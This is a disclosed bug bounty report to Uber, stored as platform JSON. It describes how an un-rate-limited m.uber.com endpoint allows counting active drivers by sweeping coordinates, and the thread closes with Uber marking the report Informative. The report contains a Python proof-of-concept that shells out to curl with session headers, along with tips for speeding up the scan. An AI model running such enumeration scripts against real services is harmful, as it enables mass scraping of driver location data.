{"id":127025,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjcwMjU=","url":"https://hackerone.com/reports/127025","title":"Brute Forcing rider-view Endpoint Allows for Counting Number of Active Uber Drivers","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-03-31T01:08:37.450Z","submitted_at":"2016-03-31T01:08:37.450Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ddworken","url":"/ddworken","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-13T22:24:22.010Z","bug_reporter_agreed_on_going_public_at":"2016-04-01T00:33:18.895Z","team_member_agreed_on_going_public_at":"2016-06-13T22:24:21.884Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"m.uber.com has an endpoint at ```https://m.uber.com/proxy-rt/product/city/rider-view``` that when called will return a list of nearby vehicles. By iterating through all latitudes and longitudes, it is possible to count the total number of active Uber drivers. \n\nThe full URL to be called is ```https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false\u0026latitude=[INSERT HERE]\u0026longitude=[INSERT HERE]```. I used Google Chrome's \"Copy as curl\" function to generate the following PoC code: \n\n``` python\nfor lat in range(-180,180):\n    for long in range(-180,180):\n        try: t = json.loads(check_output(\"\"\"curl 'https://m.uber.com/proxy-rt/product/city/rider-view?is-ride-now=false\u0026latitude=\"\"\" + str(lat) + \"\"\"\u0026longitude=\"\"\" + str(long) + \"\"\"' -H 'Cookie: logged_in=true; _LOCALE_=en_US; muber-id=[REDACTED]; version=[REDACTED]; browser_error=false; __zlcmid=ZvfRKEKucjdr2c; utag_main=v_id:[REDACTED]$_sn:9$_ss:0$_st:1459385284209$segment:a$userid:[REDACTED]$flowtype:P2P$_pn:6%3Bexp-session$ses_id:[REDACTED]%3Bexp-session; vehicle-view-id=326; token=[REDACTED]; new-version=[REDACTED]%0A; analytics-counter=65; analytics-session=%7B%22session_id%22%3A%227A84C14D-5FF6-[REDACTED]%22%2C%22session_start_time_ms%22%3A1459382073947%7D' -H 'X-Uber-Device-Language: en_US' -H 'DNT: 1' -H 'X-Uber-Token: [REDACTED]' -H 'X-Uber-Origin: m.uber.com' -H 'Accept-Encoding: gzip, deflate, sdch' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36' -H 'Accept-Language: en-US,en;q=0.8' -H 'Accept: */*' -H 'X-Uber-Device: m.uber.com' -H 'Referer: https://m.uber.com/' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'X-Uber-Device-Id: m.uber.com' --compressed\"\"\", shell=True))['vehicleViewsOrder']\n        except: pass\n        list += t\nprint len(list(set(list)))\n``` \n\nI ran through 1/360th of the above code (total of 360 requests) in approximately 6 minutes. This code can quite easily be optimized in order to increase the speed and efficiency through: \n\n1. Checking only in areas where Uber is active\n2. Decreasing the size of the increment to ```.1``` instead of the current ```1``` to ensure we catch all Uber drivers\n\nIn order to patch this you have to add rate limiting to this end point. \n\nThanks,\nDavid Dworken","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-05-01T00:33:19.395Z","allow_singular_disclosure_after":-171896557.03573075,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":881104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @ddworken, can you clarify the difference between this and the regular `cn.uber.com`/RT-API endpoint? Does this endpoint let you hit it as often as you'd like while the other one does not? Thanks!","automated_response":false,"created_at":"2016-03-31T23:53:54.431Z","updated_at":"2016-03-31T23:53:54.431Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":881112,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So far I have not started to look into the ```cn.uber.com``` domain since I have not had a chance to patch the Uber app to remove SSL pinning (which is necessary in order to view the requests). I know that this endpoint lets me hit it as often as I want, but I have not tested any apis under ```cn.uber.com```. ","automated_response":false,"created_at":"2016-04-01T00:02:20.115Z","updated_at":"2016-04-01T00:02:20.115Z","actor":{"username":"ddworken","cleared":true,"url":"/ddworken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":881130,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm going to look into this one a bit to see how this compares to our regular endpoint for our mobile apps. Rate limiting on these types of endpoints can be very tricky because of the heavy use of NAT with mobile carriers (basically a lot of mobile devices sharing the same IP address) so sometimes we have no choice but to allow a large number of requests. Obviously we don't ever want to lock out our customers from using the app, so we have to be careful.","automated_response":false,"created_at":"2016-04-01T00:13:47.140Z","updated_at":"2016-04-01T00:13:47.140Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":881131,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, so rate limiting based off of IP may not work too well, but it might work to do rate limiting for each account. ","automated_response":false,"created_at":"2016-04-01T00:15:36.836Z","updated_at":"2016-04-01T00:15:36.836Z","actor":{"username":"ddworken","cleared":true,"url":"/ddworken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":881144,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"So, I've discussed this with some of my coworkers who have worked on this kind of thing previously. The short answer is that our rate limiting is quite complex and not always obvious. Due the to nuanced nature of this sort of thing we won't be taking reports on this particular subject (massive data analysis of our driver maps) but we appreciate you taking the time to submit this to us regardless. \n\nThese kinds of issues share some space with fraud where there's a lot that goes on behind the scenes which people don't see but is always working to protect the privacy of our drivers. However we can't really talk about all of it because then fraudsters would know how it works and could better evade it. Hope that all makes sense and for that reason I'm going to close this as `Informative`.\n\nThat being said I'll assign this task to myself so please let me know if you have any other questions on this! Appreciate you taking the time and please let us know if you find any other security issues.","automated_response":false,"created_at":"2016-04-01T00:31:56.024Z","updated_at":"2016-04-01T00:31:56.024Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":881145,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Ok, sounds good. \n\nThanks,\nDavid Dworken","automated_response":false,"created_at":"2016-04-01T00:33:18.932Z","updated_at":"2016-04-01T00:33:18.932Z","first_to_agree":true,"actor":{"username":"ddworken","cleared":true,"url":"/ddworken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":953295,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can we please disclose this?\n\nThanks,\nDavid Dworken","automated_response":false,"created_at":"2016-05-12T14:37:02.278Z","updated_at":"2016-05-12T14:37:02.278Z","actor":{"username":"ddworken","cleared":true,"url":"/ddworken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/344/0f539160a7134b9d14cd1f9c8e38bbc32c3b3604_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1012087,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure thing!","automated_response":false,"created_at":"2016-06-13T22:24:21.943Z","updated_at":"2016-06-13T22:24:21.943Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1012088,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-06-13T22:24:22.038Z","updated_at":"2016-06-13T22:24:22.038Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}